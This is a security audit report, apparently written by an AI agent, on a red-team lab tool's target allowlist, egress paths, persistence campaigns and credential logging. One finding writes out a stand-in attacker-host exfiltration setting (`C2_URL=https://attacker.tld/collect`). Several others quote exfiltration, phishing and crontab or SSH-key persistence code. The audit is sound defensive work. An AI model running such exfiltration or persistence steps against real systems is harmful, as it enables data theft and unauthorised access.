# Red-Team Security Audit — 2026-08-13

**Scope audited:** `red-team/runner.py`, `red-team/campaigns/**` (16 modules), `red-team/utils/{logger,mitre_tagger}.py`, `red-team/Dockerfile`, `red-team/requirements.txt`, plus cross-references to `docker-compose.yml`, `.env.example`, `tests/test_target_allowlist.py`, `tests/integration/test_killchain.py`, `.github/workflows/integration.yml`. Out of scope: blue-team, target-env, pki-lab, forensics.

---
**[HIGH] `C2_URL` / `C2_DNS_DOMAIN` bypass the P8 target allowlist and drive real egress with TLS verification disabled**
- **MITRE ATT&CK**: T1041, T1048.003, T1071.001
- **Red Team**: `TARGET_ENV_VARS` (runner.py:263-268) enumerates only `TARGET_WEB`, `TARGET_MAIL_HOST`, `TARGET_DB_HOST`, `MITM_VICTIM`. `HttpsExfilCampaign` reads a completely different variable and makes live requests to it. Set `C2_URL=https://attacker.tld/collect` in `.env`/CI env → `_beacon()` GETs it and `_exfiltrate()` POSTs base64-encoded collected data with a spoofed browser UA, `verify=False`, and every exception swallowed into `{"status": "simulated"}`, so the run still exits 0. This is arbitrary-destination egress from the one campaign whose whole job is moving data out, and it never touches the vet-and-pin gate.
- **Blue Team**: No detection and no test. `tests/test_target_allowlist.py` covers `--target`, `TARGET_MAIL_HOST`, `TARGET_DB_HOST` only — its passing status is false assurance for `C2_URL`. The only real control is `lab-net: internal: true` (docker-compose.yml:21), which does not apply when the code is run outside a container (CI does exactly this: `.github/workflows/integration.yml:56-68` sets `AIB_SKIP_PREFLIGHT=1` on a public-internet runner).
- **Evidence**: `red-team/campaigns/exfiltration/https_exfil.py:21` `C2_URL = os.environ.get("C2_URL", "https://c2.lab.local/collect")`; line 68 `requests.get(self.C2_URL, timeout=3, verify=False)`; lines 85-91 `requests.post(self.C2_URL, data={"data": payload.decode()}, ..., verify=False)`. Same class: `red-team/campaigns/exfiltration/dns_tunnel.py:19` `C2_DOMAIN = os.environ.get("C2_DNS_DOMAIN", "exfil.lab.local")` (currently simulation-only at lines 62-71, so latent).
- **Recommendation**: Add `C2_URL` and `C2_DNS_DOMAIN` to `TARGET_ENV_VARS` so they flow through `_vet_and_pin_target`; drop `verify=False` and point the sink at an in-lab TLS service using the pki-lab CA; add an allowlist test per variable rather than per campaign.

---
**[HIGH] Allowlist is evaluated against the wrong subnet in the deployed container — `LAB_NET_PREFIX` is never passed to `red-team`**
- **MITRE ATT&CK**: N/A (containment control failure)
- **Red Team**: `_lab_networks()` builds the permitted /24 from `LAB_NET_PREFIX`, defaulting to `172.20.0`. The red-team service's `environment:` block does not include `LAB_NET_PREFIX` or `QUARANTINE_NET_PREFIX`. Under per-student isolation (`scripts/lab/student-env.sh:84` issues `172.20.<octet>`), a student running with prefix `172.20.7` gets an allowlist of `172.20.0.0/24` — i.e. the runner **permits another student's lab subnet** and **rejects the operator's own victims**. Cross-tenant targeting is authorized at the app layer; only Docker's inter-bridge isolation stops the packets.
- **Blue Team**: No startup consistency check between `ATTACKER_IP` (which *is* correctly passed) and the allowlist prefix. The failure is silent in the permissive direction and noisy in the restrictive direction, which pushes operators toward finding #8 below.
- **Evidence**: `docker-compose.yml:60-70` (env block: `TARGET_WEB`, `TARGET_DB`, `TARGET_MAIL`, `SIEM_HOST`, `ATTACKER_IP`, `LOG_LEVEL` — no `LAB_NET_PREFIX`) vs `red-team/runner.py:289` `os.environ.get("LAB_NET_PREFIX", "172.20.0")`.
- **Recommendation**: Add `- LAB_NET_PREFIX=${LAB_NET_PREFIX:-172.20.0}` and `- QUARANTINE_NET_PREFIX=${QUARANTINE_NET_PREFIX:-172.20.1}` to the red-team service; alternatively derive the prefix from `ATTACKER_IP` and hard-fail if the two disagree.

---
**[HIGH] Env-var name mismatch means the operator's vetted mail/DB host never reaches the code; hardcoded `172.20.0.31/.32` defaults skip the allowlist entirely**
- **MITRE ATT&CK**: T1566.001, T1550.002
- **Red Team**: Compose injects `TARGET_DB` and `TARGET_MAIL`; the campaigns read `TARGET_DB_HOST` and `TARGET_MAIL_HOST`. In the running lab those variables are unset, so the hardcoded IP defaults win — and `run_campaign` only vets variables that are *set* ("The built-in lab defaults are trusted", runner.py:457-469). Result: `SpearPhishCampaign` opens a live SMTP session to a hardcoded `172.20.0.32` that is out of scope under any custom prefix and is never checked by the gate. The runner's own allowlist test for `TARGET_MAIL_HOST` passes while the deployed path is unprotected.
- **Blue Team**: Confirmed by a committed run log, not theory — the SMTP connect succeeded and mail was delivered to the hardcoded host.
- **Evidence**: `red-team/campaigns/phishing/spear_phish.py:40` `MAIL_HOST = os.environ.get("TARGET_MAIL_HOST", "172.20.0.32")`; `red-team/campaigns/lateral_movement/pass_the_hash.py:18` `TARGET_DB = os.environ.get("TARGET_DB_HOST", "172.20.0.31")`; `docker-compose.yml:62-63` `- TARGET_DB=...` / `- TARGET_MAIL=...`; `red-team/logs/campaign_20260525.json:6` `"detail": "Targeting user@lab.local via 172.20.0.32"` followed by line 9 `"Email delivered to user@lab.local"`. Same defect class: `red-team/utils/mitre_tagger.py:131` `SIEM_HOST` default `172.20.0.50`.
- **Recommendation**: Make the names agree (fix compose or the campaigns), derive every default from `LAB_NET_PREFIX` or a lab service name, and vet the **effective** value — move the sweep to after default resolution rather than skipping unset variables.

---
**[MEDIUM] SIEM destination variables are unvetted and carry full campaign results, including credentials discovered by brute force**
- **MITRE ATT&CK**: T1041, T1567
- **Red Team**: `SIEM_HOST`/`SIEM_PORT` and `SIEM_SYSLOG_HOST`/`SIEM_SYSLOG_PORT` are read straight from the environment with no allowlist check, and `_post()` ships the entire campaign `result` dict — which embeds `steps[]`, i.e. strings like `admin/password123: SUCCESS` from `BruteForceCampaign.log_step`. An operator, a poisoned `.env`, or a CI variable can redirect all attack telemetry (and the credentials in it) to an arbitrary HTTP endpoint or UDP syslog collector. The telemetry channel is a second, unguarded egress path parallel to the C2 one.
- **Blue Team**: `emit_failures`/`emit_attempts` surface *reachability*, never *destination correctness* — telemetry sent successfully to the wrong host reports as a healthy green run.
- **Evidence**: `red-team/utils/mitre_tagger.py:131-132` and `:192` `url = f"http://{self.SIEM_HOST}:{self.SIEM_PORT}/{self._index_name()}/_doc"`; `red-team/campaigns/base_campaign.py:158-159` `host = os.environ.get("SIEM_SYSLOG_HOST", "logstash")`; `red-team/campaigns/credential_access/mitm.py:101-102` (duplicate of the base implementation).
- **Recommendation**: Route all four through the same allowlist sweep; restrict to the lab service names (`elasticsearch`, `logstash`) or in-subnet IPs; log the resolved destination in the run banner.

---
**[MEDIUM] Phishing recipient address is unvalidated — mail relay out of scope with an EICAR attachment**
- **MITRE ATT&CK**: T1566.001
- **Red Team**: The gate validates the SMTP *host* but nothing validates the *recipient*. `TARGET_VICTIM_EMAIL=someone@real-company.com` causes an EICAR-bearing spoofed-HR phishing message to be handed to the lab MTA for that recipient. If `victim-mail` relays (its relay posture is outside this audit's scope — verify `target-env/victim-mail/entrypoint.sh`), that is real unsolicited malware-marker email leaving the lab under a spoofed sender.
- **Blue Team**: No allowlist on the recipient domain, and no log line distinguishes an in-lab recipient from an external one; the campaign reports success identically.
- **Evidence**: `red-team/campaigns/phishing/spear_phish.py:39` `TARGET_EMAIL = os.environ.get("TARGET_VICTIM_EMAIL", "user@lab.local")`, used unchecked at `:124` `server.sendmail(self.SPOOFED_SENDER, [self.TARGET_EMAIL], msg.as_string())`.
- **Recommendation**: Require the recipient domain to be in a lab-domain allowlist (`lab.local`) and hard-fail otherwise, in the same sweep as the host allowlist.

---
**[MEDIUM] HTTP redirects are followed after pinning, defeating the vetted-IP guarantee at the application layer**
- **MITRE ATT&CK**: T1190
- **Red Team**: #145 pins the vetted IP into the target so the resolver cannot swap it, but two exploit probes use `requests.get` with the default `allow_redirects=True`. `victim-web` is deliberately vulnerable, so a 302 from it (open redirect, or a student's modification) sends the request — payloads and any session state included — to an arbitrary off-scope host that the allowlist never saw. The login probes correctly set `allow_redirects=False`; the other two do not, so this is an inconsistency rather than a design decision.
- **Blue Team**: Nothing re-vets a redirect hop; the SIEM doc records only the original vetted `target`, so the off-scope destination never appears in telemetry.
- **Evidence**: `red-team/campaigns/initial_access/exploit_web.py:94` `resp = requests.get(f"{self.target}/search?q={payload}", timeout=5)` and `:110` `requests.get(f"{self.target}/file?name={payload}", timeout=5)` — compare `:74` `allow_redirects=False`.
- **Recommendation**: Set `allow_redirects=False` on every campaign request, or wrap requests in a session hook that re-runs `_target_host`/allowlist checks on each hop.

---
**[MEDIUM] No "am I inside the lab" guard — campaigns mutate the filesystem and crontab of whatever host executes them, as root**
- **MITRE ATT&CK**: T1053.003, T1098.004, T1486
- **Red Team**: `runner.py` is directly executable from the repo and nothing checks for container context. `python red-team/runner.py --campaign persistence` on a workstation installs a real crontab entry via `crontab -`; `--campaign persistence-sshkey` appends to `/root/.ssh/authorized_keys`; `--campaign ransomware --force` renames files under `/tmp/ransom-decoys`. The image sets no `USER`, so in-container these run as root, and `./red-team:/app` + `./evidence` are bind-mounted, meaning root-owned artifacts land in the user's repo tree. The planted key is a non-parseable placeholder (`ssh-rsa AAAAB3...LAB-SIMULATION-KEY-NOT-REAL...`), which limits the persistence impact to noise rather than actual access — that is the one thing keeping this out of HIGH.
- **Blue Team**: The only environmental guard is `scripts/lab/start.sh`'s egress preflight, which is bypassable with `AIB_SKIP_PREFLIGHT` and is not consulted by `runner.py` for anything except a SIEM warning (runner.py:484).
- **Evidence**: `red-team/campaigns/persistence/cron_backdoor.py:102-104` `subprocess.run(["crontab", "-"], input=new_cron, ...)`; `red-team/campaigns/persistence/ssh_key_plant.py:68-69` `with open(auth_keys, "a") as f: f.write(...)` over `/root/.ssh/authorized_keys`; `red-team/Dockerfile` (no `USER` directive).
- **Recommendation**: In `run_campaign`, refuse to execute unless `/.dockerenv` exists or `AIB_LAB_CONFIRM=1` is explicitly set — same fail-closed shape as the existing `--force` gate.

---
**[MEDIUM] The allowlist is self-service widenable to public IP space, and the refusal message coaches the user to widen it**
- **MITRE ATT&CK**: N/A (control bypass by design)
- **Red Team**: `LAB_NET_PREFIX=93.184.216` makes `93.184.216.0/24` in-scope; nothing constrains the prefix to RFC1918/private space. The rejection text a frustrated operator sees literally instructs them to change that variable, and because of finding #2 the gate *will* wrongly reject legitimate targets under per-student prefixes, maximizing the pressure to do so. `scripts/lab/start.sh:20-28` validates only the 3-octet *format*.
- **Blue Team**: No log or alert is emitted when the allowlist is widened, and no record of the effective allowlist appears in the campaign telemetry.
- **Evidence**: `red-team/runner.py:369-374` — `"Set LAB_NET_PREFIX/QUARANTINE_NET_PREFIX to match your lab."`; `red-team/runner.py:285-297` `_lab_networks()`.
- **Recommendation**: Validate `ipaddress.ip_network(f"{prefix}.0/24").is_private` and abort otherwise; remove the widening hint from the refusal text and replace it with "verify you are running inside the lab container"; stamp the effective allowlist into the `campaign_start` lifecycle doc.

---
**[LOW] Plaintext credentials written to console, JSON log, evidence artifact and SIEM — inconsistently with the module's own redaction**
- **MITRE ATT&CK**: T1110 (tooling), T1552.001 (resulting exposure)
- **Red Team**: Successful credentials are recorded verbatim in three durable sinks. The syslog advisory in the *same method* redacts (`"params": "username=admin&password=REDACTED"`), proving the author's intent; the other paths were missed. Combined with finding #13, a brute-force run against non-lab infrastructure would write real credentials into the repo working tree.
- **Blue Team**: Violates the project's own "do not persist credentials" rule in `CLAUDE.md`; `/evidence` is chain-of-custody material that `cleanup()` deliberately never deletes.
- **Evidence**: `red-team/campaigns/credential_access/brute_force.py:75-78` (`successes.append({"username": ..., "password": password, ...})`, `self.log_step("attempt", f"{username}/{password}: SUCCESS", ...)`) and `:92` `self.save_artifact("brute_force_results.json", json.dumps(results, indent=2))`; contrast `:102`.
- **Recommendation**: Store a password hash or a fixed `REDACTED` marker in `successes`/`log_step`; keep the cleartext only in memory for the run summary count.

---
**[LOW] Predictable `/tmp` artifact paths are symlink/pre-creation attackable while running as root**
- **MITRE ATT&CK**: T1547 (adjacent), CWE-59
- **Red Team**: Fixed, world-known paths are opened for append/write and later deleted without `O_NOFOLLOW`. A local user (or a co-tenant process in a shared-namespace setup) who pre-creates `/tmp/lab_mitm.log` as a symlink gets attacker-controlled JSON appended to the target file as root; `--cleanup-all` then operates on the same paths.
- **Blue Team**: `BaseCampaign.cleanup()` does correctly guard the rmtree branch with `not os.path.islink(path)` (base_campaign.py:202) — the *write* paths lack the equivalent protection.
- **Evidence**: `red-team/campaigns/credential_access/mitm.py:60,81` `signal_path = "/tmp/lab_mitm.log"` … `with open(signal_path, "a")`; `red-team/campaigns/initial_access/malware_drop.py:32` `STAGE_PATH = "/tmp/lab_malware_drop.eicar"`; `red-team/campaigns/persistence/cron_backdoor.py:83`; `red-team/campaigns/impact/ransomware_sim.py:28,65`.
- **Recommendation**: Use `os.open(path, os.O_WRONLY|os.O_CREAT|os.O_NOFOLLOW, 0o600)`, or relocate these signals under a per-run directory inside `/evidence`.

---
**[LOW] The destructive-campaign `--force` gate is contradicted by the integration test, creating pressure to remove it**
- **MITRE ATT&CK**: N/A
- **Red Team**: A safety gate that makes the project's own CI red is a gate that gets deleted. This is the control that stops an unattended `full-killchain`.
- **Blue Team**: `run_campaign` exits 1 for `full-killchain` without `--force`, but the weekly-scheduled integration test invokes it without `--force` and asserts `returncode == 0`. I could not execute the suite to confirm the failure — recommend the tester-debugger agent verify before changing either side.
- **Evidence**: `red-team/runner.py:450-452` `if (campaign == "full-killchain" or is_impact) and not force and not dry_run: ... sys.exit(1)` vs `tests/integration/test_killchain.py:228-244` (`"runner.py", "--campaign", "full-killchain"`) and `:261-267` (`assertEqual(..., 0)`).
- **Recommendation**: Add `--force` to the integration invocation (do not weaken the gate), and add a unit test asserting the gate rejects `full-killchain` without it.

---
**[LOW] `cleanup_all()` bypasses the allowlist sweep and imports every campaign with unvetted environment**
- **MITRE ATT&CK**: N/A
- **Red Team**: `--cleanup-all` runs before any vetting, uses an unvetted `TARGET_WEB`, and importing each module freezes `C2_URL`, `MAIL_HOST`, `MITM_VICTIM` etc. from raw environment. No cleanup path dials out today, so the impact is latent — but the class-attribute pattern (finding #14) means one added network call in a `cleanup()` reintroduces the full bypass.
- **Blue Team**: The allowlist tests do not exercise the `--cleanup-all` entry point at all.
- **Evidence**: `red-team/runner.py:679-681` (`if do_cleanup: cleanup_all(); return`) and `:637` `target = os.environ.get("TARGET_WEB", "http://victim-web")`.
- **Recommendation**: Run the same `TARGET_ENV_VARS` sweep at the top of `cleanup_all()`.

---
**[LOW] Runtime campaign logs are written into the repo working tree and committed**
- **MITRE ATT&CK**: N/A
- **Red Team**: `LOG_DIR` defaults to `/app/logs`, which is the bind-mounted `./red-team`, so every run writes into the git working tree; one such log is already committed. With finding #9 unresolved, a brute-force run publishes credentials to git history.
- **Blue Team**: I verified the committed log contains only the simulated NTLM hash (`aad3b435b51404eeaad3...`, the well-known empty-LM/`password` pair) — no live secrets today.
- **Evidence**: `red-team/logs/campaign_20260525.json` (tracked); `red-team/utils/logger.py:31` `LOG_DIR = os.environ.get("LOG_DIR", "/app/logs")`; `docker-compose.yml:58` `- ./red-team:/app`.
- **Recommendation**: Add `red-team/logs/` to `.gitignore`, remove the tracked file, and point `LOG_DIR` at a named volume.

---
**[INFO] Target configuration is captured at import time as class attributes — the vet-and-pin fix works only by ordering luck**
- **Evidence**: `spear_phish.py:39-41`, `pass_the_hash.py:18`, `mitm.py:41`, `https_exfil.py:21-22`, `dns_tunnel.py:19`, `payload_gen.py:57` all evaluate `os.environ.get(...)` at class-definition time. Safety depends entirely on `runner.py:466-469` mutating `os.environ` *before* `runner.py:519` `importlib.import_module(cfg["module"])`. Any earlier import — a new top-level import in `runner.py`, a test helper, a plugin loader — silently freezes unvetted values with no error.
- **Recommendation**: Read these in `__init__`/`run()` instead of at class scope; add a unit test that imports a campaign module before calling `run_campaign` and asserts the vetted value still wins.

---
**[INFO] Allowlist dead code and parser inconsistencies**
- `_is_lab_target` (`runner.py:300-322`) is no longer called by the gate — only `tests/test_target_allowlist.py:50-82` exercises it, so eleven tests validate a code path production does not take. The live path is `_vet_and_pin_target` → `_resolve_host_ip`.
- `_pin_host_in_target` preserves userinfo (`runner.py:351-353`), producing e.g. `http://user:pass@172.20.0.30`, which `vuln_scan.py:36` (`self.target.replace("http://","").replace("https://","").split(":")[0]`) then mis-parses as host `user`. Same line breaks on pinned IPv6 literals and on targets carrying a path.
- `runner.py:350` `parts.port` raises `ValueError` on an out-of-range port (`http://172.20.0.30:99999`), producing an unhandled traceback rather than a clean refusal (fails closed, but ugly).
- **Recommendation**: Point the tests at `_vet_and_pin_target` (or delete `_is_lab_target`); strip userinfo during pinning; give campaigns a shared `_target_host`-based parser instead of ad-hoc string surgery.

---
**[INFO] Classic vulnerability classes are clean — scope of what was checked**
- Grep across `red-team/**/*.py` for `eval(`, `exec(`, `pickle`, `yaml.`, `shell=True`, `os.system`, `__import__`: **zero** matches other than the literal GTFOBins *strings* in `sudo_abuse.py:21` (data, never executed). All five `subprocess.run` call sites use list argv with timeouts (`cron_backdoor.py:98,102,116,126,133`, `suid_hunt.py:46`, `sudo_abuse.py:56`, `ssh_hijack.py:50,62`). Serialization is JSON only — no insecure deserialization surface. `importlib.import_module` inputs come from the static `CAMPAIGNS` registry, not user input.
- One latent path-traversal surface: `BaseCampaign.save_artifact` (`base_campaign.py:119`) `os.path.join(evidence_dir, filename)` with no basename check — safe today because all 11 call sites pass literals, unsafe the moment a filename becomes dynamic. Recommend `os.path.basename(filename)`.
- Dependencies are pinned exactly (`red-team/requirements.txt`) and the base image is digest-pinned (`Dockerfile:10`); the `apt-get` layer is explicitly not frozen (documented at `Dockerfile:6-9`). I did not validate the pinned versions against advisory data and will not guess CVE IDs.

---
**[INFO] ATT&CK inventory and SIEM ingest-path coverage (for purple-team cross-referencing)**

| Technique | Module | Wire activity | `emit_syslog_advisory` |
|---|---|---|---|
| T1595 / T1589 | `initial_access/vuln_scan.py` | real TCP connect + banner grab | no |
| T1566.001 | `phishing/spear_phish.py` | real SMTP | no |
| T1190 | `initial_access/exploit_web.py` | real HTTP | no |
| T1204 | `initial_access/malware_drop.py` | file write only | yes |
| T1110 | `credential_access/brute_force.py` | real HTTP POST | yes |
| T1557 | `credential_access/mitm.py` | file + own syslog | yes (private impl) |
| T1548.003 | `privilege_escalation/sudo_abuse.py` | local `sudo -l` | yes |
| T1548.001 | `privilege_escalation/suid_hunt.py` | local `find` | **no** |
| T1550.002 | `lateral_movement/pass_the_hash.py` | none (simulated) | **no** |
| T1563.001 | `lateral_movement/ssh_hijack.py` | local `find`/`who` | **no** |
| T1048.003 | `exfiltration/dns_tunnel.py` | none (simulated) | **no** |
| T1041 | `exfiltration/https_exfil.py` | real HTTP(S) | yes |
| T1486 | `impact/ransomware_sim.py` | file renames | yes |
| T1053.003 | `persistence/cron_backdoor.py` | real crontab | yes |
| T1098.004 | `persistence/ssh_key_plant.py` | file write | **no** |

The five bolded rows generate **no** network traffic and **no** syslog document, so any Sigma rule for T1548.001, T1550.002, T1563.001, T1048.003 or T1098.004 has no ingest path and cannot fire — the same defect class the audit-4 G2b advisories were introduced to fix, left incomplete.

---

## Summary

| Severity | Count | Top Finding |
|----------|-------|-------------|
| CRITICAL | 0 | — |
| HIGH | 3 | `C2_URL`/`C2_DNS_DOMAIN` are outside `TARGET_ENV_VARS`, so the exfiltration campaign performs real GET/POST to any operator-supplied host with `verify=False` |
| MEDIUM | 5 | Unvetted `SIEM_HOST`/`SIEM_SYSLOG_HOST` ship full campaign results — including brute-forced credentials — to an arbitrary destination |
| LOW | 5 | Plaintext credentials persisted to console, JSON log, `/evidence` artifact and SIEM despite the module's own redaction elsewhere |
| INFO | 4 | Five techniques emit neither wire traffic nor syslog, so their Sigma rules have no ingest path |

**Summary (as requested):** 0 CRITICAL / 3 HIGH / 5 MEDIUM / 5 LOW / 4 INFO. The most important issue is that `C2_URL` and `C2_DNS_DOMAIN` were never added to `runner.py`'s `TARGET_ENV_VARS` allowlist, so `https_exfil.py` performs live, TLS-unverified GET/POST of collected data to any host an operator, `.env`, or CI variable specifies — the wave-2 scope gate does not cover the one campaign designed to move data off-box. Two related HIGHs make the gate wrong even for the variables it does cover: `LAB_NET_PREFIX` is not passed into the red-team container (allowlist silently evaluates against `172.20.0.0/24`, i.e. another student's subnet), and a `TARGET_DB`/`TARGET_DB_HOST` + `TARGET_MAIL`/`TARGET_MAIL_HOST` naming mismatch means the operator's configured hosts never reach the code, leaving hardcoded `172.20.0.31/.32` targets that the "defaults are trusted" logic never vets.
